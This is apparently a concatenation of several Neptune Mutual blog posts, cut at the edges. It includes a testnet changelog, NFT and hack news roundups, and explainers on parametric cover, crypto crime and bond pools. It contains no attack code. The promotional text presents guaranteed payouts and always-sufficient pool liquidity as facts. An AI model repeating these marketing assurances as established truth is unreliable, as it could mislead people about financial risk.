and <em><em>getDispute</em></em> to reporter contract and interface, and completed the test coverage for these changes.</li><li>Refactored <em><em>updateCoverCreatorWhitelist</em></em> to allow access to governance agents instead of a cover manager.</li><li>Fixed multiple bugs in <em><em>getReporter</em></em> and <em><em>getResolutionInfoFor</em></em> functions; added tests to cover governance contracts for setting up roles and admin, and many others.</li></ul><p><strong>Cover Lifecycle</strong></p><ul><li>Added “whitelisted cover user” feature that allows cover creators to restrict who can purchase cover.</li><li>Added an incrementable state variable <em><em>lastPolicyId</em></em> emitted upon each cover purchase and <em><em>WeightSet</em></em> event to CoverReassurance contract</li><li>Renamed multiple functions to improve code readability and dropped obsolete contract interface <em><em>ICommission</em></em>, and other redundant functions</li></ul><p><strong>Liquidity</strong></p><ul><li>Refactored <em><em>removeLiquidity</em></em> of the Vault contract to only emit NPMUnstaken when the value is greater than zero; added a function <em><em>setLiquidityStateUpdateInterval</em></em> to the LiquidityEngine</li><li>Added an event to emit <em><em>LendingPeriodSet</em></em> when the lending period is updated; new field <em><em>certificateTokenIssued</em></em> &amp; <em><em>certificateTokenRedeemed</em></em> to Deposited and Withdrawn event of ILendingStrategy respectively.</li><li>Added <em><em>getLendingPeriods</em></em> to ILiquidityEngine, and refactored <em><em>getLendingPeriodKey</em></em> and <em><em>getWithdrawalWindowKey</em></em> on StrategyLibV1 to drop ignoreMissingKey check</li><li>Renamed multiple functions, added amount checks on VaultLiquidity, and covered all the changes with appropriate tests.</li></ul><p><strong>Policy</strong></p><ul><li>Fixed a bug in <em><em>getPolicyRatesInternal, </em></em>and refactored <em><em>setPolicyRatesByKey</em></em> to ensure only valid cover keys are accepted.</li><li>Added a new function <em><em>calculatePolicyFee to replace</em></em> the <em><em>getCoverFee </em></em>function; renamed <em><em>getCoverFee</em></em> to <em><em>getCoverCreationFeeInfo</em></em>, and <em><em>getCoverFeeInternal</em></em> to <em><em>getPolicyFeeInternal </em></em>for added clarity.</li><li>Replaced <em><em>getCoverFeeInfo</em></em> logic with <em><em>calculatePolicyFee</em></em> and dropped the latter, including other obsolete arguments and unused functions.</li><li>Added a referral code feature to <em><em>purchaseCover</em></em>, and <em><em>addLiquidity</em></em> methods; updated the tests coverage.</li></ul><p><strong>Bond and Staking Pool</strong></p><ul><li>Refactored, and added more tests to complete the code coverage of bond, and staking pool contracts and libraries.</li><li>Refactored <em><em>getName</em></em> of StakingPoolBase to return correct contract name, <em><em>createBondInternal</em></em> of BondPoolLibV1 to remove redundant <em><em>minNpmDesired</em></em>validation, and renamed the <em><em>_getCommitment</em></em> function to <em><em>_getBondCommitment for added clarity.</em></em></li></ul><p><strong>Flash Loan</strong></p><ul><li>Refactored flash loan feature to remove redundant addresses, amount validation, and transfer protocol commission after all checks are passed; completed the flash loan code test coverage.</li><li>Added a check to ensure <em><em>calculatePodsInternal</em></em> is not called during flash loan transactions.</li></ul><p><strong>NPM token</strong></p><ul><li>Added new features <em><em>issueMany</em></em> and <em><em>transferMany</em></em> to NPM token contract.</li></ul><p><strong>POD Fungibility</strong></p><ul><li>Added feature to allow transferring of PODs to different wallet addresses, claim using that address, and refactoring the codebase to drop maintaining individual account’s liquidity added and removed states.</li><li>As a result, the <em><em>_redeemPods</em></em> function doesn’t need to update the state and thus the function name is changed to <em><em>_redeemPodCalculation</em></em> to signify that it is a read-only function or a view.</li></ul><h3 id="10-newly-unlocked-features-and-pools">10 Newly-unlocked features and pools</h3><p>Throughout the duration of the testnet we gradually unlocked some of our primary protocol features.</p><p>At launch, we showed our testnet users <a href="https://blog.neptunemutual.com/neptune-mutual-testnet-is-live/" rel="follow">how to obtain testnet tokens, purchase a cover policy, and provide liquidity</a> on the Neptune Mutual platform.</p><p>A week later, we made our <a href="https://blog.neptunemutual.com/neptune-mutual-launching-on-the-polygon-testnet/" rel="follow">incident report and claim cover payout </a>features available for everyone to try out. During this time, our Discord channel shared pseudo testnet incidents that users could report in real-time.</p><p>Following this, we opened our <a href="https://blog.neptunemutual.com/npm-testnet-features-unlocked-staking-and-pod-staking/" rel="follow">staking and POD staking pools</a> and our <a href="https://blog.neptunemutual.com/neptune-mutual-bond-pool-feature-unlocked/" rel="follow">bond pool feature</a> and we shared <a href="https://blog.neptunemutual.com/how-bonds-work-on-neptune-mutual/" rel="follow">how these features work</a>.</p><h3 id="moving-forward">Moving Forward</h3><p>Our community has helped us achieve and surpass the goals that we set ourselves for our application launch on testnet.</p><p><strong><strong>We value the feedback our users shared with us</strong></strong> on how we can further develop Neptune Mutual. Based on their review and suggestions, our team has been able to move forward in preparation for the mainnet. Again, thank you.</p><p><strong><strong>As a community-centric protocol</strong></strong>, we also opened and grew different social media channels where we can connect with our users. An accomplishment that led us to grow our community way beyond our expectations.</p><p><strong><strong>Staying true to our mission</strong></strong>, we hope that our testnet has shed light on the importance of digital asset protection. Neptune Mutual can help you get covered and be more confident in this new era of blockchain technology.</p><p>A good start indeed!

The emergence of NFTs and decentralised technologies demonstrates how previously insurmountable barriers can be overcome. With the total value of all NFT transactions globally exceeding $17 billion in 2021, up from $82.5 million in 2020, the expansion of various NFT industries has grown to be more diverse, ranging from sectors such as music, fashion, arts, sports, and gaming, as well as a plethora of other areas of interest that have far eclipsed the cryptocurrency industry.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>During the minting process, attackers exploited a price manipulation vulnerability in Elephant Money’s stable-coin TRUNK, resulting in a flash loan attack that allegedly resulted in the loss of nearly 30 billion ELEPHANT tokens worth $22.2 million. Since the incident, the hijacked assets have been routed to a number of accounts before being bridged to Ethereum or sent to Tornado Cash.</p><p>Beanstalk Farms, a credit-based stablecoin protocol, was drained in a series of transactions, resulting in a projected gain of around $182 million for the hacker, with the loss of assets including 24,830 ETH and 36 million BEAN. The hack was made possible by the flash loan assisted pass on April 16, which further resulted in the crafted code execution with the governance privilege, which eventually created the sinkhole of funds from the protocol. The attacker had obtained $1 billion in AAVE protocol flash loans and used these funds to amass enough assets to take over 67 percent of the protocol’s governance and approve their own protocol.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>Line, Japan’s most popular social networking app, has launched Line NFT, their new NFT marketplace that allows 90 million Japanese users to buy and sell about 40,000 NFTs. Characters from the classic well-known anime series Patlabor the Mobile Police, as well as artwork of other iconic characters, will be depicted in the first wave of soon-to-be-released NFTs, which will incorporate videos from the company’s in-house Yoshimoto NFT Theatre.</p><p>Amazon CEO Andy Jassy expects NFTs to continue growing and has hinted at the company’s potential interest in selling NFTs in the distant future. According to him, the world’s largest online retailer and cloud computing behemoth is not close to integrating cryptocurrency payments, but the company may use NFTs in the future. Despite stating that it has no immediate plans to add digital assets to its e-commerce marketplace, Amazon appears to be committed to incorporating web3 technology into its business model. If Amazon integrates NFTs into its platform, it will join the ranks of eBay, Shopify, Facebook, and Instagram as world leaders to enter into the cryptocurrency space.</p><p>Punk6529, a well-known NFT collector, has unveiled an open Metaverse museum district that aims to house the most high-end art NFT ever displayed in one location. The self-funded project, dubbed OM, intends to be an open platform built and shared by the community, with the goal of launching 10 self-governing cities, each with a maximum population of 10 million people. At this point, anyone with ideas that are similar to those of the museum district can join and build in the alpha, while OM anticipates a public beta later in June or July, noting the project attracts enough users and the tech team advances to further support and development for large spaces.</p><p>Emirates has become the latest airline to enter the world of NFTs, with plans to release a token with collectibility and utility properties in the coming months. Sheikh Ahmed, Chairman and CEO of Emirates Airline and Group, expressed their excitement about the prospects in the future digital space, as well as the airline’s significant financial and resource commitment to developing products and services that have the potential to deliver on revenue, brand experience, and efficiencies.</p><p>The Golden State Warriors, one of the most successful NBA teams, has collaborated with the cryptocurrency platform FTX to launch the Playoff NFT Collection of 3000 digital collectibles featuring 12 unique designs. Each design has a different level of rarity with special utilities and benefits such as NBA Finals tickets, autographed items, Warriors NBA Championship Rings, and more. Each NFT will cost $499.99, with a portion of all proceeds going to the Warriors Community Foundation charity organisation.</p><p>Sega is launching a five-year plan for Sonic the Hedgehog and other characters called Super Game, with hopes of expanding into cloud-based gaming and NFTs. Sega Producer Masayoshi Kikuchi hinted that the Super Game plan could lead to Sega launching its own Metaverse initiative, which would include interactive titles as one of its many benefits. The move is motivated by the box office success of ‘Sonic the Hedgehog 2’, their upcoming Netflix streaming show, and Sonic’s overall global brand recognition.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: "<p><strong><strong>The crypto market is often volatile. This means delays that get compensated for losses can be highly problematic. A challenge traditional insurance models are struggling to surpass.</strong></strong></p><p><strong><strong>Protocol parametric protection offers a simpler alternative with defined terms and wider coverage. More importantly, it is versatile and flexible enough to accommodate changes in an evolving digital assets market.</strong></strong></p><p>Blockchain-based digital assets are transforming how financial markets operate and how users all over the globe interact with financial systems. And what a wild ride it has been. From zero market value less than 15 years ago to a total value estimated at over $3 trillion in 2022.</p><p>However, this growth has been accompanied by a corresponding increase in risks. Cyberattacks and data breaches worth billions of dollars in the digital assets space strike fear in the hearts of market participants and stakeholders.</p><p>Decentralised protocol cover might provide the necessary safety net that investors and stakeholders need to protect their digital assets and transact with more confidence.</p><p>But first, what are these digital assets worth protecting?</p><h2 id=\"categorising-digital-assets\">Categorising Digital Assets</h2><p>The digital assets market and underlying blockchain technologies are evolving rapidly; this makes it difficult to establish a precise definition and categorisation of digital assets. Given the rate at which the market changes it doesn’t take long before definitions become out-of-date.</p><p>As it stands, the simplest way to describe digital assets is that they represent value in digital form. From a regulatory standpoint, the <a href=\"https://www.finma.ch/en/news/2018/02/20180216-mm-ico-wegleitung/\" rel=\"nofollow noopener noreferrer\">Swiss Financial Market Supervisory Authority (FINMA) </a>focuses on the economic function and purpose when defining digital assets. It also classifies tokens in terms of three primary categories:</p><ul><li><strong><strong>Payment tokens </strong></strong>— These assets are driven by market demand and supply. Examples include Bitcoin, Ether, Litecoin, Dash, and Bitcoin Cash.</li><li><strong><strong>Utility tokens</strong></strong> — These assets are unique to their respective ecosystems. They allow users to perform certain actions or gain digital access within a specific network. Examples include ChainLink (Link), and Basic Attention Token (BAT).</li><li><strong><strong>Asset/security tokens</strong></strong> — These tokens represent digital claims on a physical asset and are therefore backed by that asset. In terms of function, they are comparable in certain respects, to real-world assets such as equities, bonds, or derivatives.</li></ul><h2 id=\"what-digital-assets-are-most-targeted-by-cyber-criminals\">What Digital Assets are Most Targeted by Cyber Criminals?</h2><p>All categories of digital assets are subject to risk. In addition to the risk of targeted hacks and data breaches, the market is inherently volatile, which presents its own set of risks. There are also risks in terms of custody, technology flaws, asset valuation, and regulatory change, amongst others.</p><p>However, based on how much has been lost so far, DeFi digital assets have proven to be the most targeted over recent years:</p><h3 id=\"decentralised-finance-defi-projects\">Decentralised Finance (DeFi) Projects</h3><p>Despite their swift growth and mass adoption, DeFi projects are among the most hacked blockchain protocols in recent times. In 2021 alone, the total value locked (TVL) in DeFi projects rose from around $18.2 billion to well over $243 billion. But in the same period, over $1.3 billion was lost to criminals, according to <a href=\"https://www.coindesk.com/business/2022/01/13/funds-lost-to-defi-hacks-more-than-doubled-to-13b-in-2021-certik/\" rel=\"nofollow noopener noreferrer\">CoinDesk</a>.</p><p>In a related analysis, DeFi project hacks are <a href=\"https://www.thehindu.com/sci-tech/technology/defi-hacks-accounted-for-76-of-major-hacks-in-2021/article36219935.ece\" rel=\"nofollow noopener noreferrer\">reported</a> to account for around 76% of major hacks in 2021.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/07/ppp-defi-tvl.jpeg\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"862\" height=\"565\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/07/ppp-defi-tvl.jpeg 600w, https://blog.neptunemutual.com/content/images/2022/07/ppp-defi-tvl.jpeg 862w\" sizes=\"(min-width: 720px) 720px\"><figcaption><strong><em>DeFi TVL to date | Source: </em></strong><a href=\"https://www.defipulse.com/\" rel=\"nofollow noopener noreferrer\"><strong><em>defipulse.com</em></strong></a></figcaption></figure><h3 id=\"cryptocurrencies\">Cryptocurrencies</h3><p>Crypto markets have been flourishing since Bitcoin made its debut in 2009.

One month later, an attack on the Ronin bridge system for the popular NFT-based game, Axie Infinity, <a href=\"https://edition.cnn.com/2022/03/29/tech/axie-infinity-ronin-hack/index.html\" rel=\"nofollow noopener noreferrer\">lost over $600 million</a> following a network breach.</p><h3 id=\"there%E2%80%99s-simply-no-accounting-for-all-the-risks\">There’s Simply No Accounting For All The Risks!</h3><p>The reality for digital asset owners is that nothing is 100% secure. Even if they adhere to all the security best practices, other risk elements, such as code exploits, flash loan attacks, human error, and rug pulls, remain ever-present.</p><p>Cover protection can become a crucial factor in mitigating these risks and facilitating an environment where market participants can initiate transactions more confidently. But while traditional insurance has been pivotal in improving risk management and operational efficiencies in finance, progress has been slow when it comes to protection for blockchain-based assets.</p><p>In part, this is due to the different nature of digital assets and the ecosystem within which they fit. Peer-to-peer digital asset transactions in reality often take place wallet-to-wallet where there is no information available about either party, and this obviously doesn’t work well in a traditional insurance model context where you need to prove your identity, your ownership of an asset, and prove that the loss of you have suffered conforms with the terms of your policy.</p><p>This leads to another issue relating to the blockchain ecosystem and digital assets which is that frequently the digital assets and the risks they are exposed to are highly technical, and equally importantly the exclusions that relate to policies are also highly technical. It can often be far from clear to policyholders what risks their policy protects them against, and what it does not. This can lead to situations where users pay for policies and expect to receive a payout as a result of a hack or exploit, only to find that the specific technical nature of the exploit was excluded from their policy.</p><p>This lack of clarity about what policies cover has accelerated the need for a new approach, namely, parametric cover.</p><h2 id=\"basics-of-parametric-cover-protection\">Basics of Parametric Cover Protection</h2><p>From the name alone, it’s easy to get a general idea of what parametric cover is all about. It’s a type of policy that provides a financial payout conditional on a set of parameters that define the risk events that the policy protects against. When these predefined parameters are met, the policyholder automatically receives a predefined payout.</p><p>Because payouts are tied to predefined parameters being met, the insurance policy is disconnected from an underlying asset, as well as any damage or losses sustained on that asset. In other words, instead of trying to quantify losses to determine whether a payout should be released and how much, the insurer only needs confirmation that the event leading to the loss indeed occurred, in order to make the agreed-upon monetary payment.</p><h2 id=\"major-benefits-of-parametric-cover-protection\">Major Benefits Of Parametric Cover Protection</h2><p>Parametric coverage offers many benefits, including:</p><ul><li><strong><strong>Replaces subjectivity (discretion) with objectivity (parameters)</strong></strong> — Coverage is based on objective, agreed-upon parametric triggers. The event that triggers the payout either happened or not. Furthermore, and importantly, it is the event that is assessed, not individuals’ losses; this makes the payout process more predictable and reliable.</li><li><strong><strong>Quicker payouts </strong></strong>— Claims payouts, and the rules for releasing them, are predetermined. This allows for policyholders to be paid within days of a validated incident, instead of weeks or months.</li><li><strong><strong>Elimination of the claim adjustment process</strong></strong> — With parametric cover there’s no claims assessment process for individual policyholders, so no need for an adjuster to investigate countless claims using a discretionary approach and often, questionable outcomes.</li></ul><h2 id=\"protocol-parametric-protection-with-neptune-mutual\">Protocol Parametric Protection With Neptune Mutual</h2><p>The Neptune Mutual ecosystem is built on four founding principles — security, scalability, risk minimisation, and user experience. Together, they create a conducive environment for stakeholders to facilitate the exchange of value within the system.</p><p>There are four primary stakeholders:</p><h3 id=\"cover-creators\">Cover Creators</h3><p>Under the Neptune Mutual ecosystem, cover creators can generate parametric-based cover protocols with guaranteed stable coin liquidity to cover losses resulting from specific hacks or smart contract vulnerabilities.</p><h3 id=\"liquidity-providers\">Liquidity Providers</h3><p>By providing liquidity into cover pools these stakeholders earn a variety of income and rewards. Income from the protocol includes cover policyholder fees, flash loan interests, and lending incomes arising from loans of “excess” capital within the pool. Other rewards for liquidity providers can come in the form of staking rewards, native project tokens, and discounted NPM tokens.</p><h3 id=\"npm-token-holders\">NPM Token Holders</h3><p>These stakeholders are integral to incident governance and reporting. Using a fair, transparent, and efficient system, NPM token holders vote to confirm whether a triggering incident occurred or not. The resolution is made within 7 days of the incident.</p><h3 id=\"policyholders\">Policyholders </h3><p>Anyone can become a policyholder by connecting their wallet to the platform, navigating to a cover pool, selecting the cover amount and duration, and confirming the transaction.</p><p>If an incident occurs that appears to fall within the scope of the cover parameters, it will be reported and be subject to the community incident validation process that determines whether or not a cover pool should payout or not.</p><p>If a cover incident is validated by the community then a payout to ALL policyholders of that cover pool is guaranteed.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/07/ppp-cover-stakeholders.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"880\" height=\"496\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/07/ppp-cover-stakeholders.png 600w, https://blog.neptunemutual.com/content/images/2022/07/ppp-cover-stakeholders.png 880w\" sizes=\"(min-width: 720px) 720px\"><figcaption><strong><em>Source: </em></strong><a href=\"https://neptunemutual.com/\" rel=\"follow\"><strong><em>neptunemutual.com</em></strong></a></figcaption></figure><p>Once the incident report process is initiated, withdrawal of liquidity from the cover pool is automatically suspended. The rules of the protocol are such that there is always more liquidity available in the cover pool than the total liability underwritten by cover policyholders’ payout; this ensures that there will always be sufficient funds in the pool to cover all valid claims.</p><h2 id=\"creating-a-parametric-cover-pool\">Creating a Parametric Cover Pool</h2><p>Cover creators can set up new dedicated cover pools by staking NPM tokens, the fixed and deflationary native token of the Neptune Mutual ecosystem.</p><p>The minimum stake required to initiate the cover creation process is 4,000 NPM tokens. The more NPM tokens staked by the cover creator, the better the cover pool’s ranking and visibility on the Neptune Mutual product list.</p><p>The cover creation process itself is straightforward and can be broken down into three simple steps:</p><h3 id=\"1-define-the-parameters-and-check-exclusions\">1. Define the Parameters and Check Exclusions</h3><p>What are the parameters of the risks that the cover will protect against? What are the exclusions to those parameters? Generally speaking, the fewer and more specific the parameters, the better. The parameters also need to be binary, that is to say, either true or false. Exclusions should be kept to a minimum and typically include: deliberate and malicious actions by the project team; or, acts of gross negligence on the part of the project team.</p><p>Let’s say a cover creator wants to create a parametric cover pool for their DeFi lending platform. They might include a parameter that states that if a smart contract code is hacked and the amount lost is over $10 million. If any of these parameters are fulfilled, the incident resolution and payout process are automatically triggered.</p><p><strong>Price the Cover</strong></p><p>This involves setting up a pricing spreadsheet containing a number of variables that influence policy pricing offered by the cover pool. Examples of these factors include floor and ceiling price, cover commitment, and reassurance pool support, just to name a few.</p><p>Many cover creators that are confident in the security of their projects will want to provide confidence to liquidity providers through a reassurance mechanism. This is one in which a reassurance pool that is financed by the cover creator is used to recapitalise the liquidity of the cover pool (up to a certain percentage) in the event that a validated incident arises causing liquidity to be drained from the pool. It is provided by cover creators to provide a layer of protection to the capital provided by liquidity providers.</p><h3 id=\"2-attract-liquidity-providers\">2. Attract Liquidity Providers</h3><p>The cover pool will require enough liquidity to get it started. There are different ways to go about this. Usually, cover creators will invest their own capital to kickstart the process of attracting liquidity. They will also attract liquidity providers through the use of the numerous features available on the platform, including staking and proof-of-deposit (POD) staking programs, and so on.</p><h3 id=\"3-communicate-launch\">3. Communicate Launch</h3><p>Neptune Mutual and cover creators will work closely together to communicate the value of parametric protection to their respective communities. Putting in place a solution that can rapidly provide a payout in the event of a hack or exploit demonstrates a mature and considered approach to risk management as well as a sensible and respectful way of looking after the interests of a community.</p><p>Neptune Mutual recently launched its <a href=\"https://blog.neptunemutual.com/neptune-mutual-launching-on-the-polygon-testnet/\" rel=\"follow\">protocol testnet on the Polygon network</a>.

The number of NFT trademark applications filed with the United States Patent and Trademark Office increased dramatically from 3 in 2020 to 421 in 2021, and this trend is expected to continue in the coming years. The growth of the industry attracted hacks, attacks, and breaches in the same way. In 2022, there has been a reported loss of assets worth more than $1.18 billion, in over 18 breaches worth millions of dollars. Ronin Network leads the race, with a recently reported breach costing $624 million, while Wormhole Bridge lost $326 million in the same time period.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>On April 7th, Wonderhero, a play-to-earn mobile NFT game, was the victim of a cross-chain bridging withdrawal exploit via the BNB chain. The attackers obtained the signature and minted 80 million $WND on BNB Chain, which they then traded for 750 BNB worth more than $300,000 through PancakeSwap. By disabling all WonderHero platform services and trading on listed exchanges, the team was able to suspend all services for users while also preventing further hacker attacks.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>The UK government is planning to launch its own NFT in an effort to transform its economy into a global crypto-asset hub and a crypto-friendly environment in order to generate job opportunities and accelerate innovation. The UK’s economic secretary to the Treasury, John Glen, stated in a speech at the Innovate Finance Global Summit that the country’s coin supplier has been directed to develop an NFT.</p><p>Mastercard is experimenting with web3 technology for the first time, joining Visa, AmEx, and JP Morgan, among others as some of the big financial firms to enter the metaverse. The payment behemoth has applied for fifteen metaverse-related trademarks, assuring that they were the first to use brand assets in the metaverse and web3 space. These Mastercard filings include the words “Mastercard” and the company’s “circles logo.”</p><p>VeVe, a mobile NFT platform, partners with Coca-Cola. The two companies had intended to create an NFT series devoted to Coke’s limited edition “Starlight” flavour. The Starlight NFT is available in three series, Coca-Cola Starlight Can, Coca-Cola Creations Footprint, and 1985 Coca-Cola Space Can, and costs as little as $40 in the VeVe app on any Android or iOS device.</p><p>NFT adoption gains traction in a variety of industries. ESPN released its first NFT collection, in the form of a digital magazine, featuring NFL legend and cryptocurrency enthusiast Tom Brady on the DraftKings Marketplace. The ‘Tom Brady: Greatest of All Time’ NFT is an official Autograph NFT included in ‘The Man in the Arena Collection,’ which contains 250 digital collectibles priced at $100 each.</p><p>AC Milan worked with BitMEX and FanSea to create their first-ever limited-edition NFTs, as they seek to engage with their 500 million international fans in new ways. The club is selling a limited-edition 3D NFT of a special Rossoneri jersey from South Sudan to benefit the NPO’s charitable and humanitarian initiatives around the world. Beginning April 14th, interested fans will be able to purchase one or more of the only 75,817 certified pieces of digital memorabilia.</p><p>Cyber Yacht, the first metaverse yacht company, recently announced the NFT, a $400 million mega yacht. The company’s current focus is on developing fully unique yacht metaverse plans and providing all potential buyers with both digital and physical yacht experiences. The current pricing keeps this digital collectible as the most expensive NFT if sold, with members receiving a real-world fully constructed yacht and access to a physical club in Florida, among many other benefits.</p><p>DAO Maker announced the creation of an NFT launchpad as part of their NFT foray. Aside from DAO Maker’s new ventures, the newly created platform will host the first-ever Maradona-licensed NFT collection, which will feature 5,000 images of the iconic Diego Maradona. The digital collection honours the soccer legend’s legacy, which leaves an imprint on the fields and in the hearts of his adoring fans and family.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: "<p>Crypto crime is undoubtedly an ever-present risk to both huge projects and your everyday retail investor. Syphoning billions in digital assets, several illicit transactions find their way to a few crypto wallets⁠ — owned by cybercriminal whales.</p><p>Early this year, authorities seized over $3.6 billion worth of $BTC in what was their largest seizure of stolen assets yet.</p><p>While some cyber criminals may be on a solo hunt of their own, it’s possible organised networks are responsible for most crypto crimes.</p><p>From intricate scams and hacks to million-dollar exploits, it’s likely these cybercriminal whales aren’t acting alone. Big fish, little fish.</p><h2 id=\"so-where-do-most-criminal-wallet-funds-come-from\">So, where do most criminal wallet funds come from?</h2><p>Over the last five years, there has been a significant increase in criminal balances in 2021, according to Chainalysis’ Crypto Crime Report 2022. In 2021, they held over 11 billion US dollars of digital assets sourced from suspected illicit addresses, a far cry from 2020's $3 billion.</p><p>Stolen funds make up most of the illicit transactions that bloat cybercriminal whale wallet addresses. By the end of 2021, $9.8 billion of funds held by criminal balances came from cryptocurrency theft.</p><p>It is the most damaging and frequent crypto crime activity. On this scale, it’s hard not to believe that organised groups are behind this work to exploit smart contract and code vulnerabilities.</p><p>Darknet market revenue is second to crypto crime activity at $448 million. Organised crime groups and individuals are infamous for most of what happens on the dark net. It’s possible cybercriminals use crypto for anonymity, speed, ease, and laundering.</p><p>On the more deceitful side of the criminal spectrum, scams and fraud have generated a combined $258 million. Scam exploits might as well be the most organised crypto crime of them all. Known for having massive email and SMS campaigns, a lot of influencer marketing, and amplifying investors’ FOMO.</p><h2 id=\"is-crypto-crime-on-the-rise\">Is Crypto Crime on the Rise?</h2><p>The complexity and reach of crypto crime show syndicates may as well exist in the blockchain. The modern-day criminal is no longer a mobster with a tailored suit. It’s invisible, unseen.</p><p>Known only by cryptic usernames and wallet addresses. Laptops and VPNs are their new hand-carry pistols. It may be less violent, but it is just as worse.</p><p>Because of crypto crime, blockchain projects built by passionate developers lose millions and their direction. Retail investors wake up the next morning with their wallets drained empty.</p><p>Alone, a cybercriminal can do only just as much. Together, they can form a highly organised crypto syndicate that steals, phishes, and/or exploits like clockwork.</p><h2 id=\"join-the-neptune-mutual-testnet\">Join the Neptune Mutual Testnet</h2><p><a href=\"https://gleam.io/tPydn/npm-testnet-unlock-the-gold-vault\" rel=\"nofollow noopener noreferrer\">Register on Gleam</a> to join the NPM ‘Unlock the Gold Vault’ protocol testnet contest.</p><p><a href=\"https://neptunemutual.medium.com/\" rel=\"nofollow noopener noreferrer\">Follow us on Medium</a> to stay updated on all our latest announcements and future releases.</p><p>Explore Neptune Mutual’s other unique features:</p><ul><li><a href=\"https://medium.com/neptune-mutual/neptune-mutual-testnet-is-live-12eec012679b\" rel=\"nofollow noopener noreferrer\">Purchase cover policy and provide liquidity</a></li><li><a href=\"https://medium.com/neptune-mutual/neptune-mutual-launches-on-the-polygon-testnet-eaad48e2531b\" rel=\"nofollow noopener noreferrer\">Incident reports and claim cover payouts</a></li><li><a href=\"https://medium.com/neptune-mutual/neptune-mutual-bond-pool-feature-unlocked-15a57ba590c4\" rel=\"nofollow noopener noreferrer\">Bond pools</a></li><li><a href=\"https://medium.com/neptune-mutual/npm-testnet-features-unlocked-staking-and-pod-staking-b68517b371b3\" rel=\"nofollow noopener noreferrer\">Staking and POD staking</a></li></ul><p>Test the Neptune Mutual protocol on<a href=\"http://test.neptunemutual.com/\" rel=\"follow\"> test.neptunemutual.com</a></p><p>Visit<a href=\"https://faucet.polygon.technology/\" rel=\"nofollow noopener noreferrer\"> https://faucet.polygon.technology/</a> to get your Polygon testnet tokens.</p><hr><h2 id=\"about-us\">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p></p><p>With Neptune Mutual, users can supply liquidity into a decentralised exchange (DEX) by adding a DAI-NPM pair.</p><p>In return, users get a proof of deposit (POD) token they can use either to reclaim the DAI/NPM liquidity they supplied, or to exchange it for discounted NPM tokens in the Neptune Mutual bond pool. On the platform, you can find this functionality in the Bond tab.</p><p>Let’s find out why one might want to supply liquidity to a DEX and potentially exchange liquidity pool (LP) tokens for NPM tokens:</p><h2 id="how-do-neptune-mutual-bonds-work">How Do Neptune Mutual Bonds Work?</h2><p>Neptune Mutual’s Bond feature lets you exchange a certain amount of DAI/NPM liquidity you’ve supplied for discounted NPM tokens.</p><p>To purchase a bond on the platform, you have to supply DAI/NPM liquidity to any DEX available on Neptune Mutual. In exchange, you get rewarded a fee based on all trades that follow after you supply liquidity to the pool. The amount of fees you receive is proportional to the amount of DAI/NPM liquidity you supplied in comparison to the total amount of liquidity in the pool.</p><p>After you’ve supplied liquidity to the DEX, you can reconvert your LP tokens back into DAI/NPM tokens.</p><p>If you want to “sell” DAI/NPM liquidity in the Neptune Mutual bond pool, you need to exchange your LP tokens in the Neptune Mutual bond pool in exchange for NPM tokens.</p><p>When you commit LP tokens to the bond pool, the discount on the price of these tokens, the bond price, is correlated to the current market price of NPM tokens.</p><p>The combination of the number of NPM tokens you receive along with the bond price will determine the ROI estimate calculated at the time of the transaction.</p><p><em><em>Note that you will only get your NPM tokens after the lockup period.</em></em></p><p>You will make a greater ROI than expected if there’s an increase in the market price of NPM tokens between when you complete your bond transaction and when you claim your NPM tokens after the lockup period.</p><p>On the other hand, if the market price of NPM tokens drops below the discounted price when you claim your NPM tokens, then you will incur a loss, assuming of course that you decide to sell your NPM tokens at that point.</p><p>Now that you know what happens in the Neptune Mutual bond feature, take a look at this short <a href="https://blog.neptunemutual.com/neptune-mutual-bond-pool-feature-unlocked/" rel="follow">video and step-by-step guide on how to purchase bonds on the Neptune Mutual platform.</a></p><h2 id="join-the-neptune-mutual-testnet">Join the Neptune Mutual Testnet</h2><p><a href="https://gleam.io/tPydn/npm-testnet-unlock-the-gold-vault" rel="nofollow noopener noreferrer">Register on Gleam</a> to join the NPM ‘Unlock the Gold Vault’ protocol testnet contest.

        html: "<h2 id=\"tldr\">TL;DR</h2><ul><li>In one of the largest crypto hacks of all time, the Ronin Network lost over $600 million in stolen digital assets.</li><li>Inverse Finance suffered a $15 million loss in a manipulation bug exploit.</li><li>OpenSea announced its upcoming integration with the Solana blockchain.</li><li>Liverpool Football Club launched LFC Heroes Club NFT; AS Monaco joined hands with Capital Block as their NFT Consultant.</li><li>Warner Bros is set to release an exclusive set of Batman NFTs.</li></ul><p>Several companies have filed for traditional patents to protect their brands from being co-opted by NFT creators, more companies are sure to follow. It is important for distinctive regulations, and protection strategies to be kept in place for artists, content creators, and brands to allow users to ripe these benefits in a multitude of ways.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks</h2><p>Ronin, an EVM blockchain for play-to-earn games and a vital bridge chain for Axie Infinity, was hacked in one of the largest hacks in blockchain history. 173,600 ETH was stolen from the Ronin network, and another 25.5 million USDC was taken from the Ronin bridge, totaling $614 million in stolen assets. According to a community notice published by Ronin, the incident occurred after Ronin validator nodes and Axie DAO validator nodes were infiltrated, resulting in hacked private keys being used to fabricate two fake network withdrawals that absorbed hundreds of millions of dollars in crypto from the bridge. The stolen assets have been funneled into FTX, Huobi, and CryptoCom, all of which have pledged to track down the funds.</p><p>Another victim of a reentrancy flaw was Voltage Finance whose protocol was exploited by hackers who stole more than $4 million in stablecoins and cryptocurrencies from the DeFi platform's lending pool. Voltage assured users that all assets in its custody, including staked tokens and tokens in liquidity pools, are safe, and that their smart contracts have been audited. They've been attempting to contact the attacker and negotiate a reward for the restoration of funds, while the platform is investigating the matter with its lending-as-a-service partner 